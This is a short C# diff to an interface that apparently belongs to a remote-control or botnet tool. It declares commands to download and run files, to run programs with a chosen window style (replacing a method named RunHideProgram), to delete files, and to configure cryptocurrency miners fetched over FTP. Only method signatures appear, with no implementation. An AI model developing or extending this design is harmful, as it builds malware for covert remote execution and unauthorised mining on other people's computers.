@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -21,8 +22,8 @@ namespace Interfaces.Users
         void Reconnect();
         void Disconnect();
         void RunM();
-        void RunHideProgram(string file);
-        void DownloadAndRun(string file);
+        void RunProgram(string file, string verb, string args, ProcessWindowStyle style, bool useShellExecute);
+        void DownloadAndRun(string file, string localPath, string verb, string args, ProcessWindowStyle style, bool useShellExecute);
         void DeleteFile(string file);
         ISetting GetSetting();
         void SetMSettings(string ftpFloader, string localFloader, string fileName, string args, bool isMiner, DDMiners valute);
